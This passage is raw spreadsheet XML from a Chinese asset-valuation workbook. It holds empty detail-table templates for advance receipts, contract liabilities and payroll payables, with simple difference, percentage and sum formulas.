      <c r="G26" s="555" t="n"/>
      <c r="H26" s="588" t="n"/>
      <c r="I26" s="555" t="n"/>
      <c r="J26" s="555" t="n"/>
      <c r="K26" s="555">
        <f>J26-I26</f>
        <v/>
      </c>
      <c r="L26" s="555">
        <f>IF(I26=0,"",K26/I26*100)</f>
        <v/>
      </c>
      <c r="M26" s="383" t="n"/>
    </row>
    <row r="27" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A27" s="116" t="n"/>
      <c r="B27" s="380" t="n"/>
      <c r="C27" s="381" t="n"/>
      <c r="D27" s="587" t="n"/>
      <c r="E27" s="380" t="n"/>
      <c r="F27" s="380" t="n"/>
      <c r="G27" s="555" t="n"/>
      <c r="H27" s="588" t="n"/>
      <c r="I27" s="555" t="n"/>
      <c r="J27" s="555" t="n"/>
      <c r="K27" s="555">
        <f>J27-I27</f>
        <v/>
      </c>
      <c r="L27" s="555">
        <f>IF(I27=0,"",K27/I27*100)</f>
        <v/>
      </c>
      <c r="M27" s="383" t="n"/>
    </row>
    <row r="28" ht="16.5" customFormat="1" customHeight="1" s="116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380" t="n"/>
      <c r="F28" s="380" t="n"/>
      <c r="G28" s="555">
        <f>ROUND(SUM(G6:G27),2)</f>
        <v/>
      </c>
      <c r="H28" s="380" t="n"/>
      <c r="I28" s="555">
        <f>ROUND(SUM(I6:I27),2)</f>
        <v/>
      </c>
      <c r="J28" s="555">
        <f>ROUND(SUM(J6:J27),2)</f>
        <v/>
      </c>
      <c r="K28" s="555">
        <f>J28-I28</f>
        <v/>
      </c>
      <c r="L28" s="555">
        <f>IF(I28=0,"",K28/I28*100)</f>
        <v/>
      </c>
      <c r="M28" s="383" t="n"/>
    </row>
    <row r="29" s="415">
      <c r="A29" s="116" t="n"/>
    </row>
    <row r="30" s="415">
      <c r="A30" s="116" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="4">
    <mergeCell ref="B1:M1"/>
    <mergeCell ref="B2:M2"/>
    <mergeCell ref="B28:C28"/>
    <mergeCell ref="B4:E4"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:M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0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 codeName="Sheet85">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:M28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12.8333333333333" customWidth="1" style="410" min="1" max="1"/>
    <col width="6.66666666666667" customWidth="1" style="410" min="2" max="2"/>
    <col width="29.1666666666667" customWidth="1" style="410" min="3" max="3"/>
    <col width="14" customWidth="1" style="410" min="4" max="4"/>
    <col width="16" customWidth="1" style="410" min="5" max="5"/>
    <col hidden="1" outlineLevel="1" width="8.33333333333333" customWidth="1" style="410" min="6" max="6"/>
    <col hidden="1" outlineLevel="1" width="10.6666666666667" customWidth="1" style="410" min="7" max="7"/>
    <col hidden="1" outlineLevel="1" width="11.3333333333333" customWidth="1" style="410" min="8" max="8"/>
    <col collapsed="1" width="15.6666666666667" customWidth="1" style="410" min="9" max="9"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="10" max="11"/>
    <col outlineLevel="1" width="8.66666666666667" customWidth="1" style="410" min="12" max="12"/>
    <col width="16.3333333333333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预收款项评估明细表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7" t="n"/>
      <c r="L3" s="547" t="n"/>
      <c r="M3" s="402" t="inlineStr">
        <is>
          <t>表5-6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63" t="n"/>
      <c r="G4" s="563" t="n"/>
      <c r="H4" s="563" t="n"/>
      <c r="I4" s="376" t="n"/>
      <c r="J4" s="376" t="n"/>
      <c r="K4" s="376" t="n"/>
      <c r="L4" s="376" t="n"/>
      <c r="M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业务内容</t>
        </is>
      </c>
      <c r="F5" s="379" t="inlineStr">
        <is>
          <t>币种</t>
        </is>
      </c>
      <c r="G5" s="379" t="inlineStr">
        <is>
          <t>外币账面金额</t>
        </is>
      </c>
      <c r="H5" s="379" t="inlineStr">
        <is>
          <t>评估基准日汇率</t>
        </is>
      </c>
      <c r="I5" s="307" t="inlineStr">
        <is>
          <t>账面价值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87" t="n"/>
      <c r="E6" s="380" t="n"/>
      <c r="F6" s="380" t="n"/>
      <c r="G6" s="555" t="n"/>
      <c r="H6" s="588" t="n"/>
      <c r="I6" s="555" t="n"/>
      <c r="J6" s="555" t="n"/>
      <c r="K6" s="555">
        <f>J6-I6</f>
        <v/>
      </c>
      <c r="L6" s="555">
        <f>IF(I6=0,"",K6/I6*100)</f>
        <v/>
      </c>
      <c r="M6" s="383" t="n"/>
    </row>
    <row r="7" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="381" t="n"/>
      <c r="D7" s="587" t="n"/>
      <c r="E7" s="380" t="n"/>
      <c r="F7" s="380" t="n"/>
      <c r="G7" s="555" t="n"/>
      <c r="H7" s="588" t="n"/>
      <c r="I7" s="580" t="n"/>
      <c r="J7" s="555" t="n"/>
      <c r="K7" s="555">
        <f>J7-I7</f>
        <v/>
      </c>
      <c r="L7" s="555">
        <f>IF(I7=0,"",K7/I7*100)</f>
        <v/>
      </c>
      <c r="M7" s="383" t="n"/>
    </row>
    <row r="8" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="587" t="n"/>
      <c r="E8" s="380" t="n"/>
      <c r="F8" s="380" t="n"/>
      <c r="G8" s="555" t="n"/>
      <c r="H8" s="588" t="n"/>
      <c r="I8" s="580" t="n"/>
      <c r="J8" s="555" t="n"/>
      <c r="K8" s="555">
        <f>J8-I8</f>
        <v/>
      </c>
      <c r="L8" s="555">
        <f>IF(I8=0,"",K8/I8*100)</f>
        <v/>
      </c>
      <c r="M8" s="383" t="n"/>
    </row>
    <row r="9" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="587" t="n"/>
      <c r="E9" s="380" t="n"/>
      <c r="F9" s="380" t="n"/>
      <c r="G9" s="555" t="n"/>
      <c r="H9" s="588" t="n"/>
      <c r="I9" s="580" t="n"/>
      <c r="J9" s="555" t="n"/>
      <c r="K9" s="555">
        <f>J9-I9</f>
        <v/>
      </c>
      <c r="L9" s="555">
        <f>IF(I9=0,"",K9/I9*100)</f>
        <v/>
      </c>
      <c r="M9" s="383" t="n"/>
    </row>
    <row r="10" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="587" t="n"/>
      <c r="E10" s="380" t="n"/>
      <c r="F10" s="380" t="n"/>
      <c r="G10" s="555" t="n"/>
      <c r="H10" s="588" t="n"/>
      <c r="I10" s="580" t="n"/>
      <c r="J10" s="555" t="n"/>
      <c r="K10" s="555">
        <f>J10-I10</f>
        <v/>
      </c>
      <c r="L10" s="555">
        <f>IF(I10=0,"",K10/I10*100)</f>
        <v/>
      </c>
      <c r="M10" s="383" t="n"/>
    </row>
    <row r="11" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="587" t="n"/>
      <c r="E11" s="380" t="n"/>
      <c r="F11" s="380" t="n"/>
      <c r="G11" s="555" t="n"/>
      <c r="H11" s="588" t="n"/>
      <c r="I11" s="580" t="n"/>
      <c r="J11" s="555" t="n"/>
      <c r="K11" s="555">
        <f>J11-I11</f>
        <v/>
      </c>
      <c r="L11" s="555">
        <f>IF(I11=0,"",K11/I11*100)</f>
        <v/>
      </c>
      <c r="M11" s="383" t="n"/>
    </row>
    <row r="12" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="587" t="n"/>
      <c r="E12" s="380" t="n"/>
      <c r="F12" s="380" t="n"/>
      <c r="G12" s="555" t="n"/>
      <c r="H12" s="588" t="n"/>
      <c r="I12" s="580" t="n"/>
      <c r="J12" s="555" t="n"/>
      <c r="K12" s="555">
        <f>J12-I12</f>
        <v/>
      </c>
      <c r="L12" s="555">
        <f>IF(I12=0,"",K12/I12*100)</f>
        <v/>
      </c>
      <c r="M12" s="383" t="n"/>
    </row>
    <row r="13" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="587" t="n"/>
      <c r="E13" s="380" t="n"/>
      <c r="F13" s="380" t="n"/>
      <c r="G13" s="555" t="n"/>
      <c r="H13" s="588" t="n"/>
      <c r="I13" s="580" t="n"/>
      <c r="J13" s="555" t="n"/>
      <c r="K13" s="555">
        <f>J13-I13</f>
        <v/>
      </c>
      <c r="L13" s="555">
        <f>IF(I13=0,"",K13/I13*100)</f>
        <v/>
      </c>
      <c r="M13" s="383" t="n"/>
    </row>
    <row r="14" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="587" t="n"/>
      <c r="E14" s="380" t="n"/>
      <c r="F14" s="380" t="n"/>
      <c r="G14" s="555" t="n"/>
      <c r="H14" s="588" t="n"/>
      <c r="I14" s="580" t="n"/>
      <c r="J14" s="555" t="n"/>
      <c r="K14" s="555">
        <f>J14-I14</f>
        <v/>
      </c>
      <c r="L14" s="555">
        <f>IF(I14=0,"",K14/I14*100)</f>
        <v/>
      </c>
      <c r="M14" s="383" t="n"/>
    </row>
    <row r="15" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="587" t="n"/>
      <c r="E15" s="380" t="n"/>
      <c r="F15" s="380" t="n"/>
      <c r="G15" s="555" t="n"/>
      <c r="H15" s="588" t="n"/>
      <c r="I15" s="580" t="n"/>
      <c r="J15" s="555" t="n"/>
      <c r="K15" s="555">
        <f>J15-I15</f>
        <v/>
      </c>
      <c r="L15" s="555">
        <f>IF(I15=0,"",K15/I15*100)</f>
        <v/>
      </c>
      <c r="M15" s="383" t="n"/>
    </row>
    <row r="16" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="587" t="n"/>
      <c r="E16" s="380" t="n"/>
      <c r="F16" s="380" t="n"/>
      <c r="G16" s="555" t="n"/>
      <c r="H16" s="588" t="n"/>
      <c r="I16" s="580" t="n"/>
      <c r="J16" s="555" t="n"/>
      <c r="K16" s="555">
        <f>J16-I16</f>
        <v/>
      </c>
      <c r="L16" s="555">
        <f>IF(I16=0,"",K16/I16*100)</f>
        <v/>
      </c>
      <c r="M16" s="383" t="n"/>
    </row>
    <row r="17" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="587" t="n"/>
      <c r="E17" s="380" t="n"/>
      <c r="F17" s="380" t="n"/>
      <c r="G17" s="555" t="n"/>
      <c r="H17" s="588" t="n"/>
      <c r="I17" s="580" t="n"/>
      <c r="J17" s="555" t="n"/>
      <c r="K17" s="555">
        <f>J17-I17</f>
        <v/>
      </c>
      <c r="L17" s="555">
        <f>IF(I17=0,"",K17/I17*100)</f>
        <v/>
      </c>
      <c r="M17" s="383" t="n"/>
    </row>
    <row r="18" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="587" t="n"/>
      <c r="E18" s="380" t="n"/>
      <c r="F18" s="380" t="n"/>
      <c r="G18" s="555" t="n"/>
      <c r="H18" s="588" t="n"/>
      <c r="I18" s="580" t="n"/>
      <c r="J18" s="555" t="n"/>
      <c r="K18" s="555">
        <f>J18-I18</f>
        <v/>
      </c>
      <c r="L18" s="555">
        <f>IF(I18=0,"",K18/I18*100)</f>
        <v/>
      </c>
      <c r="M18" s="383" t="n"/>
    </row>
    <row r="19" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="587" t="n"/>
      <c r="E19" s="380" t="n"/>
      <c r="F19" s="380" t="n"/>
      <c r="G19" s="555" t="n"/>
      <c r="H19" s="588" t="n"/>
      <c r="I19" s="580" t="n"/>
      <c r="J19" s="555" t="n"/>
      <c r="K19" s="555">
        <f>J19-I19</f>
        <v/>
      </c>
      <c r="L19" s="555">
        <f>IF(I19=0,"",K19/I19*100)</f>
        <v/>
      </c>
      <c r="M19" s="383" t="n"/>
    </row>
    <row r="20" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="587" t="n"/>
      <c r="E20" s="380" t="n"/>
      <c r="F20" s="380" t="n"/>
      <c r="G20" s="555" t="n"/>
      <c r="H20" s="588" t="n"/>
      <c r="I20" s="580" t="n"/>
      <c r="J20" s="555" t="n"/>
      <c r="K20" s="555">
        <f>J20-I20</f>
        <v/>
      </c>
      <c r="L20" s="555">
        <f>IF(I20=0,"",K20/I20*100)</f>
        <v/>
      </c>
      <c r="M20" s="383" t="n"/>
    </row>
    <row r="21" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="587" t="n"/>
      <c r="E21" s="380" t="n"/>
      <c r="F21" s="380" t="n"/>
      <c r="G21" s="555" t="n"/>
      <c r="H21" s="588" t="n"/>
      <c r="I21" s="580" t="n"/>
      <c r="J21" s="555" t="n"/>
      <c r="K21" s="555">
        <f>J21-I21</f>
        <v/>
      </c>
      <c r="L21" s="555">
        <f>IF(I21=0,"",K21/I21*100)</f>
        <v/>
      </c>
      <c r="M21" s="383" t="n"/>
    </row>
    <row r="22" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="587" t="n"/>
      <c r="E22" s="380" t="n"/>
      <c r="F22" s="380" t="n"/>
      <c r="G22" s="555" t="n"/>
      <c r="H22" s="588" t="n"/>
      <c r="I22" s="580" t="n"/>
      <c r="J22" s="555" t="n"/>
      <c r="K22" s="555">
        <f>J22-I22</f>
        <v/>
      </c>
      <c r="L22" s="555">
        <f>IF(I22=0,"",K22/I22*100)</f>
        <v/>
      </c>
      <c r="M22" s="383" t="n"/>
    </row>
    <row r="23" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="587" t="n"/>
      <c r="E23" s="380" t="n"/>
      <c r="F23" s="380" t="n"/>
      <c r="G23" s="555" t="n"/>
      <c r="H23" s="588" t="n"/>
      <c r="I23" s="580" t="n"/>
      <c r="J23" s="555" t="n"/>
      <c r="K23" s="555">
        <f>J23-I23</f>
        <v/>
      </c>
      <c r="L23" s="555">
        <f>IF(I23=0,"",K23/I23*100)</f>
        <v/>
      </c>
      <c r="M23" s="383" t="n"/>
    </row>
    <row r="24" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="587" t="n"/>
      <c r="E24" s="380" t="n"/>
      <c r="F24" s="380" t="n"/>
      <c r="G24" s="555" t="n"/>
      <c r="H24" s="588" t="n"/>
      <c r="I24" s="580" t="n"/>
      <c r="J24" s="555" t="n"/>
      <c r="K24" s="555">
        <f>J24-I24</f>
        <v/>
      </c>
      <c r="L24" s="555">
        <f>IF(I24=0,"",K24/I24*100)</f>
        <v/>
      </c>
      <c r="M24" s="383" t="n"/>
    </row>
    <row r="25" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="587" t="n"/>
      <c r="E25" s="380" t="n"/>
      <c r="F25" s="380" t="n"/>
      <c r="G25" s="555" t="n"/>
      <c r="H25" s="588" t="n"/>
      <c r="I25" s="580" t="n"/>
      <c r="J25" s="555" t="n"/>
      <c r="K25" s="555">
        <f>J25-I25</f>
        <v/>
      </c>
      <c r="L25" s="555">
        <f>IF(I25=0,"",K25/I25*100)</f>
        <v/>
      </c>
      <c r="M25" s="383" t="n"/>
    </row>
    <row r="26" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="381" t="n"/>
      <c r="D26" s="587" t="n"/>
      <c r="E26" s="380" t="n"/>
      <c r="F26" s="380" t="n"/>
      <c r="G26" s="555" t="n"/>
      <c r="H26" s="588" t="n"/>
      <c r="I26" s="580" t="n"/>
      <c r="J26" s="555" t="n"/>
      <c r="K26" s="555">
        <f>J26-I26</f>
        <v/>
      </c>
      <c r="L26" s="555">
        <f>IF(I26=0,"",K26/I26*100)</f>
        <v/>
      </c>
      <c r="M26" s="383" t="n"/>
    </row>
    <row r="27" ht="16.5" customFormat="1" customHeight="1" s="116">
      <c r="A27" s="116" t="n"/>
      <c r="B27" s="380" t="n"/>
      <c r="C27" s="381" t="n"/>
      <c r="D27" s="587" t="n"/>
      <c r="E27" s="380" t="n"/>
      <c r="F27" s="380" t="n"/>
      <c r="G27" s="555" t="n"/>
      <c r="H27" s="588" t="n"/>
      <c r="I27" s="580" t="n"/>
      <c r="J27" s="555" t="n"/>
      <c r="K27" s="555">
        <f>J27-I27</f>
        <v/>
      </c>
      <c r="L27" s="555">
        <f>IF(I27=0,"",K27/I27*100)</f>
        <v/>
      </c>
      <c r="M27" s="383" t="n"/>
    </row>
    <row r="28" ht="16.5" customFormat="1" customHeight="1" s="116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380" t="n"/>
      <c r="F28" s="380" t="n"/>
      <c r="G28" s="555">
        <f>ROUND(SUM(G6:G27),2)</f>
        <v/>
      </c>
      <c r="H28" s="380" t="n"/>
      <c r="I28" s="580">
        <f>ROUND(SUM(I6:I27),2)</f>
        <v/>
      </c>
      <c r="J28" s="555">
        <f>ROUND(SUM(J6:J27),2)</f>
        <v/>
      </c>
      <c r="K28" s="555">
        <f>J28-I28</f>
        <v/>
      </c>
      <c r="L28" s="555">
        <f>IF(I28=0,"",K28/I28*100)</f>
        <v/>
      </c>
      <c r="M28" s="383" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="4">
    <mergeCell ref="B1:M1"/>
    <mergeCell ref="B2:M2"/>
    <mergeCell ref="B28:C28"/>
    <mergeCell ref="B4:E4"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:M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1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 codeName="Sheet86">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:J28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9" customWidth="1" style="410" min="1" max="1"/>
    <col width="5.66666666666667" customWidth="1" style="410" min="2" max="2"/>
    <col width="26.8333333333333" customWidth="1" style="410" min="3" max="3"/>
    <col width="11.8333333333333" customWidth="1" style="410" min="4" max="4"/>
    <col width="15.5" customWidth="1" style="410" min="5" max="5"/>
    <col width="15.6666666666667" customWidth="1" style="410" min="6" max="6"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="7" max="8"/>
    <col outlineLevel="1" width="8.66666666666667" customWidth="1" style="410" min="9" max="9"/>
    <col width="15.8333333333333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合同负债评估明细表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373" t="n"/>
      <c r="H3" s="373" t="n"/>
      <c r="I3" s="373" t="n"/>
      <c r="J3" s="402" t="inlineStr">
        <is>
          <t>表5-7</t>
        </is>
      </c>
    </row>
    <row r="4" ht="16.5" customHeight="1" s="415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项目及内容</t>
        </is>
      </c>
      <c r="D5" s="380" t="inlineStr">
        <is>
          <t>发生日期</t>
        </is>
      </c>
      <c r="E5" s="380" t="inlineStr">
        <is>
          <t>结算内容</t>
        </is>
      </c>
      <c r="F5" s="380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6.5" customHeight="1" s="415">
      <c r="A6" s="116" t="n"/>
      <c r="B6" s="380" t="n"/>
      <c r="C6" s="381" t="n"/>
      <c r="D6" s="587" t="n"/>
      <c r="E6" s="381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Height="1" s="415">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="381" t="n"/>
      <c r="D7" s="587" t="n"/>
      <c r="E7" s="381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Height="1" s="415">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="587" t="n"/>
      <c r="E8" s="381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6.5" customHeight="1" s="415">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="587" t="n"/>
      <c r="E9" s="381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6.5" customHeight="1" s="415">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="587" t="n"/>
      <c r="E10" s="381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Height="1" s="415">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="587" t="n"/>
      <c r="E11" s="381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Height="1" s="415">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="587" t="n"/>
      <c r="E12" s="381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Height="1" s="415">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="587" t="n"/>
      <c r="E13" s="381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Height="1" s="415">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="587" t="n"/>
      <c r="E14" s="381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Height="1" s="415">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="587" t="n"/>
      <c r="E15" s="381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Height="1" s="415">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="587" t="n"/>
      <c r="E16" s="381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Height="1" s="415">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="587" t="n"/>
      <c r="E17" s="381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Height="1" s="415">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="587" t="n"/>
      <c r="E18" s="381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Height="1" s="415">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="587" t="n"/>
      <c r="E19" s="381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Height="1" s="415">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="587" t="n"/>
      <c r="E20" s="381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Height="1" s="415">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="587" t="n"/>
      <c r="E21" s="381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Height="1" s="415">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="587" t="n"/>
      <c r="E22" s="381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Height="1" s="415">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="587" t="n"/>
      <c r="E23" s="381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Height="1" s="415">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="587" t="n"/>
      <c r="E24" s="381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Height="1" s="415">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="587" t="n"/>
      <c r="E25" s="381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Height="1" s="415">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="381" t="n"/>
      <c r="D26" s="587" t="n"/>
      <c r="E26" s="381" t="n"/>
      <c r="F26" s="555" t="n"/>
      <c r="G26" s="555" t="n"/>
      <c r="H26" s="555">
        <f>G26-F26</f>
        <v/>
      </c>
      <c r="I26" s="555">
        <f>IF(F26=0,"",H26/F26*100)</f>
        <v/>
      </c>
      <c r="J26" s="383" t="n"/>
    </row>
    <row r="27" ht="16.5" customHeight="1" s="415">
      <c r="A27" s="116" t="n"/>
      <c r="B27" s="380" t="n"/>
      <c r="C27" s="381" t="n"/>
      <c r="D27" s="587" t="n"/>
      <c r="E27" s="381" t="n"/>
      <c r="F27" s="555" t="n"/>
      <c r="G27" s="555" t="n"/>
      <c r="H27" s="555">
        <f>G27-F27</f>
        <v/>
      </c>
      <c r="I27" s="555">
        <f>IF(F27=0,"",H27/F27*100)</f>
        <v/>
      </c>
      <c r="J27" s="383" t="n"/>
    </row>
    <row r="28" ht="16.5" customHeight="1" s="415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115" t="n"/>
      <c r="F28" s="555">
        <f>SUM(F6:F27)</f>
        <v/>
      </c>
      <c r="G28" s="555">
        <f>SUM(G6:G27)</f>
        <v/>
      </c>
      <c r="H28" s="555">
        <f>G28-F28</f>
        <v/>
      </c>
      <c r="I28" s="555">
        <f>IF(F28=0,"",H28/F28*100)</f>
        <v/>
      </c>
      <c r="J28" s="383" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="3">
    <mergeCell ref="B1:J1"/>
    <mergeCell ref="B2:J2"/>
    <mergeCell ref="B28:C28"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:J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5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 codeName="Sheet87">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:I28"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="M17" sqref="M17"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="9" customWidth="1" style="410" min="1" max="1"/>
    <col width="7.83333333333333" customWidth="1" style="410" min="2" max="2"/>
    <col width="32.1666666666667" customWidth="1" style="410" min="3" max="3"/>
    <col width="13" customWidth="1" style="410" min="4" max="4"/>
    <col width="15.6666666666667" customWidth="1" style="410" min="5" max="5"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="6" max="7"/>
    <col outlineLevel="1" width="9.16666666666667" customWidth="1" style="410" min="8" max="8"/>
    <col width="18.1666666666667" customWidth="1" style="410" min="9" max="9"/>
    <col width="9" customWidth="1" style="410" min="10" max="16384"/>
  </cols>
  <sheetData>
    <row r="1" ht="30" customFormat="1" customHeight="1" s="368">
      <c r="A1" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B1" s="371" t="inlineStr">
        <is>
          <t>应付职工薪酬评估明细表</t>
        </is>
      </c>
    </row>
    <row r="2" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A2" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B2" s="547">
        <f>'2-分类汇总'!B2</f>
        <v/>
      </c>
    </row>
    <row r="3" ht="18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402" t="inlineStr">
        <is>
          <t>表5-8</t>
        </is>
      </c>
    </row>
    <row r="4" ht="18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402">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
    </row>
    <row r="5" ht="18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结算内容</t>
        </is>
      </c>
      <c r="D5" s="380" t="inlineStr">
        <is>
          <t>发生日期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80" t="inlineStr">
        <is>
          <t>备注</t>
        </is>
      </c>
    </row>
    <row r="6" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A6" s="116" t="n"/>
      <c r="B6" s="380" t="n"/>
      <c r="C6" s="381" t="n"/>
      <c r="D6" s="587" t="n"/>
      <c r="E6" s="555" t="n"/>
      <c r="F6" s="555" t="n"/>
      <c r="G6" s="555">
        <f>F6-E6</f>
        <v/>
      </c>
      <c r="H6" s="555">
        <f>IF(E6=0,"",G6/E6*100)</f>
        <v/>
      </c>
      <c r="I6" s="383" t="n"/>
    </row>
    <row r="7" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="381" t="n"/>
      <c r="D7" s="587" t="n"/>
      <c r="E7" s="555" t="n"/>
      <c r="F7" s="555" t="n"/>
      <c r="G7" s="555">
        <f>F7-E7</f>
        <v/>
      </c>
      <c r="H7" s="555">
        <f>IF(E7=0,"",G7/E7*100)</f>
        <v/>
      </c>
      <c r="I7" s="383" t="n"/>
    </row>
    <row r="8" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="587" t="n"/>
      <c r="E8" s="555" t="n"/>
      <c r="F8" s="555" t="n"/>
      <c r="G8" s="555">
        <f>F8-E8</f>
        <v/>
      </c>
      <c r="H8" s="555">
        <f>IF(E8=0,"",G8/E8*100)</f>
        <v/>
      </c>
      <c r="I8" s="383" t="n"/>
    </row>
